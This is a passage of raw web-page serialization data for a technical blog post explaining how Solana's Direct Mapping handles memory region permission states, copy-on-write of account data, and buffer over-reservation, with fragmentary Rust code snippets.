rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" host_addr\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cell\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start host address\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],\"$L336\",\"$L337\",\"$L338\",\"$L339\",\"$L33a\",\"$L33b\",\"$L33c\",\"$L33d\",\"$L33e\",\"$L33f\",\"$L340\",\"$L341\",\"$L342\",\"$L343\",\"$L344\",\"$L345\",\"$L346\",\"$L347\",\"$L348\",\"$L349\",\"$L34a\",\"$L34b\",\"$L34c\",\"$L34d\",\"$L34e\",\"$L34f\",\"$L350\",\"$L351\",\"$L352\",\"$L353\",\"$L354\",\"$L355\",\"$L356\",\"$L357\",\"$L358\",\"$L359\",\"$L35a\",\"$L35b\",\"$L35c\",\"$L35d\",\"$L35e\",\"$L35f\",\"$L360\",\"$L361\",\"$L362\",\"$L363\",\"$L364\",\"$L365\",\"$L366\",\"$L367\",\"$L368\",\"$L369\",\"$L36a\",\"$L36b\",\"$L36c\",\"$L36d\",\"$L36e\",\"$L36f\",\"$L370\",\"$L371\",\"\\n\",\"$L372\",\"$L373\",\"$L374\",\"$L375\",\"$L376\",\"$L377\",\"$L378\",\"$L379\",\"$L37a\",\"$L37b\",\"$L37c\",\"$L37d\",\"$L37e\",\"$L37f\",\"$L380\",\"$L381\",\"$L382\",\"$L383\",\"$L384\",\"$L385\",\"$L386\",\"$L387\",\"$L388\",\"$L389\",\"$L38a\",\"$L38b\",\"$L38c\",\"$L38d\",\"$L38e\",\"$L38f\",\"$L390\",\"$L391\",\"$L392\",\"$L393\",\"$L394\",\"$L395\",\"$L396\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"77:[\"$\",\"p\",\"p-66\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Each \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" now tracks its permission state and enforces access controls on data writes. When a program tries to write to account data, the runtime immediately checks the region's state and either allows the write, triggers a copy-on-write operation, or rejects the access entirely.\"]}]\n"])</script><script>self.__next_f.push([1,"78:[\"$\",\"p\",\"p-67\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The key change is the addition of the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"state\"}],\" field that replaces the simple \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"is_writable\"}],\" boolean. This allows for more sophisticated permission management, particularly the \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Cow(u64)\"}],\" state that triggers copy-on-write operations when needed.\"]}]\n"])</script><script>self.__next_f.push([1,"79:[\"$\",\"h3\",\"h3-15\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Copy-on-Write (CoW) Strategy\"}]\n7a:[\"$\",\"p\",\"p-68\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Now let's start discussing why an additional copy-on-write state is required.\"}]\n7b:[\"$\",\"h4\",\"h4-7\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Avoid Authoritative Data Contamination\"}]\n"])</script><script>self.__next_f.push([1,"7c:[\"$\",\"p\",\"p-69\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Aside from plain read and write authorization, Direct Mapping introduces an even greater problem, the rollback of changes on transaction reverts. But why is this a problem? Aren't the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedDatas\"}],\" in \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" already a cache? This boils down to some details of \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" that we ommitted earlier.\"]}]\n"])</script><script>self.__next_f.push([1,"7d:[\"$\",\"p\",\"p-70\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"When \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" are first created, \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData.data\"}],\" actually points to the authoritative account data of the persistent storage (notice \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" is an \",[\"$\",\"code\",\"code-4\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Arc::\u003cVec\u003cu8\u003e\u003e\"}],\"). Upon flushing account changes to \",[\"$\",\"code\",\"code-5\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" on CPI or instruction boundaries, if the data is modified, \",[\"$\",\"code\",\"code-6\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Arc::make_mut\"}],\" will be called to create a copy of the data to avoid contamination of the authoritative copy. This is effectively a copy-on-write mechanism to prevent \",[\"$\",\"code\",\"code-7\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" from having to clone all account data. The effectiveness is however limited by the need to serialize data into VMs.\"]}]\n"])</script><script>self.__next_f.push([1,"7e:[\"$\",\"p\",\"p-71\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"With Direct Mapping, the serialization is removed, allowing us to fully enjoy the benifits copy-on-write brings, but it is also no longer possible to rely on calling \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Arc::make_mut\"}],\" on CPI and instruction boundaries to protect the authoritative copy. Instead, the copy-on-write mechanism needs to be inlined into the timely memory access verfications.\"]}]\n"])</script><script>self.__next_f.push([1,"7f:[\"$\",\"p\",\"p-72\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"This is where the copy-on-write state comes in handy. By adding a dedicated state, Solana can differentiate between first and latter writes to account data. First writes will see a \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" of the state \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CoW\"}],\" and consequently make a copy of the data buffer and update the state. Latter writes will then see a state of \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Writable\"}],\", and know that we're already operating on a dedicated copy and no longer need to worry about contanimating authoritative data.\"]}]\n"])</script><script>self.__next_f.push([1,"80:[\"$\",\"h4\",\"h4-8\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Buffer Reallocation Management\"}]\n"])</script><script>self.__next_f.push([1,"81:[\"$\",\"p\",\"p-73\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Naturally, with the Direct Mapping enabled, we'd also need to address account data growth possibilities. A naive approach would be to resize the underlying \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" buffer whenever more space is required. This approach is inefficient, however, since each resize might introduce a realloc of the data buffer, and in turn, require a copy of the data. Frequent copies defeat the entire purpose of the Direct Mapping optimization.\"]}]\n"])</script><script>self.__next_f.push([1,"82:[\"$\",\"p\",\"p-74\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Solana's approach is to instead over-reserve the reallocated buffer size. On the first copy of the data (i.e. copy-on-write), the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData.data\"}],\" reserves a buffer big enough to accommodate the max account data growth allowed by a transaction. This removes the need to constantly reallocate the buffer.\"]}]\n83:[\"$\",\"p\",\"p-75\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/copy_on_write.png\",\"alt\":\"Copy on Write\"}]}]}]\n"])</script><script>self.__next_f.push([1,"84:[\"$\",\"p\",\"p-76\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Summarizing the ideas, copy-on-write under Direct Mapping appears as shown in the diagram above, where \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" may have it's \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"data\"}],\" vector clones, and \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" must have its \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Host_Addr\"}],\" updated accordingly.\"]}]\n"])</script><script>self.__next_f.push([1,"85:[\"$\",\"p\",\"p-77\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"For reference, the code for writing to virtual memory now looks like this. Where memory access authorization is checked inline, and a callback function is used to update \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData.data\"}],\" for buffers in CoW state.\"]}]\n"])</script><script>self.__next_f.push([1,"86:[\"$\",\"pre\",\"pre-9\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"create_vm\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'b\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"EbpfVm\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RequisiteVerifier\"]}],[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InvokeContext\"]}],\"$L397\",\"$L398\",\"$L399\",\"$L39a\",\"$L39b\",\"$L39c\",\"$L39d\",\"$L39e\",\"$L39f\",\"$L3a0\",\"$L3a1\",\"$L3a2\",\"$L3a3\",\"$L3a4\",\"$L3a5\",\"$L3a6\",\"$L3a7\",\"$L3a8\",\"$L3a9\",\"$L3aa\",\"$L3ab\",\"$L3ac\",\"$L3ad\",\"$L3ae\",\"$L3af\",\"$L3b0\",\"$L3b1\",\"$L3b2\",\"$L3b3\",\"$L3b4\",\"$L3b5\",\"$L3b6\",\"$L3b7\",\"$L3b8\",\"$L3b9\",\"$L3ba\",\"$L3bb\",\"$L3bc\",\"$L3bd\",\"$L3be\",\"$L3bf\",\"$L3c0\",\"$L3c1\",\"$L3c2\",\"$L3c3\",\"$L3c4\",\"$L3c5\",\"$L3c6\",\"$L3c7\",\"$L3c8\",\"$L3c9\",\"$L3ca\",\"$L3cb\",\"$L3cc\",\"$L3cd\",\"$L3ce\",\"$L3cf\",\"$L3d0\",\"$L3d1\",\"$L3d2\",\"$L3d3\",\"$L3d4\",\"$L3d5\",\"$L3d6\",\"$L3d7\",\"$L3d8\",\"$L3d9\",\"$L3da\",\"$L3db\",\"$L3dc\",\"$L3dd\",\"$L3de\",\"$L3df\",\"$L3e0\",\"$L3e1\",\"$L3e2\",\"$L3e3\",\"$L3e4\",\"$L3e5\",\"$L3e6\",\"$L3e7\",\"$L3e8\",\"$L3e9\",\"$L3ea\",\"$L3eb\",\"$L3ec\",\"$L3ed\",\"$L3ee\",\"$L3ef\",\"$L3f0\",\"$L3f1\",\"$L3f2\",\"$L3f3\",\"$L3f4\",\"$L3f5\",\"$L3f6\",\"$L3f7\",\"$L3f8\",\"$L3f9\",\"$L3fa\",\"$L3fb\",\"$L3fc\",\"$L3fd\",\"$L3fe\",\"$L3ff\",\"$L400\",\"$L401\",\"$L402\",\"$L403\",\"$L404\",\"$L405\",\"$L406\",\"$L407\",\"$L408\",\"$L409\",\"$L40a\",\"$L40b\",\"$L40c\",\"$L40d\",\"$L40e\",\"$L40f\",\"$L410\",\"$L411\",\"$L412\",\"$L413\",\"$L414\",\"$L415\",\"$L416\",\"$L417\",\"$L418\",\"$L419\",\"$L41a\",\"$L41b\",\"$L41c\",\"$L41d\",\"$L41e\",\"$L41f\",\"$L420\",\"$L421\",\"$L422\",\"$L423\",\"$L424\",\"$L425\",\"$L426\",\"$L427\",\"$L428\",\"            accounts\\n\",\"$L429\",\"$L42a\",\"$L42b\",\"$L42c\",\"$L42d\",\"$L42e\",\"$L42f\",\"$L430\",\"$L431\",\"$L432\",\"$L433\",\"$L434\",\"$L435\",\"$L436\",\"$L437\",\"$L438\",\"$L439\",\"$L43a\",\"$L43b\",\"$L43c\",\"$L43d\",\"$L43e\",\"$L43f\",\"$L440\",\"$L441\",\"$L442\",\"$L443\",\"\\n\",\"$L444\",\"$L445\",\"$L446\",\"$L447\",\"$L448\",\"$L449\",\"$L44a\",\"$L44b\",\"$L44c\",\"$L44d\",\"$L44e\",\"$L44f\",\"$L450\",\"$L451\",\"$L452\",\"$L453\",\"$L454\",\"$L455\",\"$L456\",\"$L457\",\"$L458\",\"$L459\",\"$L45a\",\"$L45b\",\"$L45c\",\"$L45d\",\"$L45e\",\"$L45f\",\"$L460\",\"$L461\",\"$L462\",\"$L463\",\"$L464\",\"$L465\",\"$L466\",\"$L467\",\"$L468\",\"$L469\",\"$L46a\",\"$L46b\",\"$L46c\",\"$L46d\",\"$L46e\",\"$L46f\",\"$L470\",\"$L471\",\"$L472\",\"$L473\",\"$L474\",\"$L475\",\"$L476\",\"$L477\",\"$L478\",\"$L479\",\"$L47a\",\"$L47b\",\"$L47c\",\"$L47d\",\"$L47e\",\"$L47f\",\"$L480\",\"$L481\",\"$L482\",\"$L483\",\"$L484\",\"$L485\",\"$L486\",\"$L487\",\"$L488\",\"$L489\",\"$L48a\",\"$L48b\",\"$L48c\",\"\\n\",\"$L48d\",\"$L48e\",\"$L48f\",\"$L490\",\"$L491\",\"$L492\",\"$L493\",\"$L494\",\"$L495\",\"$L496\",\"$L497\",\"$L498\",\"$L499\",\"$L49a\",\"$L49b\",\"$L49c\",\"$L49d\",\"$L49e\",\"$L49f\",\"$L4a0\",\"$L4a1\",\"$L4a2\",\"$L4a3\",\"$L4a4\",\"$L4a5\",\"$L4a6\",\"$L4a7\",\"$L4a8\",\"$L4a9\",\"$L4aa\",\"$L4ab\",\"$L4ac\",\"$L4ad\",\"$L4ae\",\"$L4af\",\"$L4b0\",\"$L4b1\",\"$L4b2\",\"$L4b3\",\"$L4b4\",\"$L4b5\",\"$L4b6\",\"$L4b7\",\"$L4b8\",\"$L4b9\",\"$L4ba\",\"$L4bb\",\"$L4bc\",\"$L4bd\",\"$L4be\",\"$L4bf\",\"$L4c0\",\"$L4c1\",\"$L4c2\",\"$L4c3\",\"$L4c4\",\"$L4c5\",\"$L4c6\",\"$L4c7\",\"$L4c8\",\"$L4c9\",\"$L4ca\",\"$L4cb\",\"$L4cc\",\"$L4cd\",\"$L4ce\",\"$L4cf\",\"$L4d0\",\"$L4d1\",\"$L4d2\",\"$L4d3\",\"$L4d4\",\"$L4d5\",\"$L4d6\",\"$L4d7\",\"$L4d8\",\"$L4d9\",\"$L4da\",\"$L4db\",\"$L4dc\",\"$L4dd\",\"$L4de\",\"$L4df\",\"$L4e0\",\"$L4e1\",\"$L4e2\",\"$L4e3\",\"$L4e4\",\"$L4e5\",\"$L4e6\",\"$L4e7\"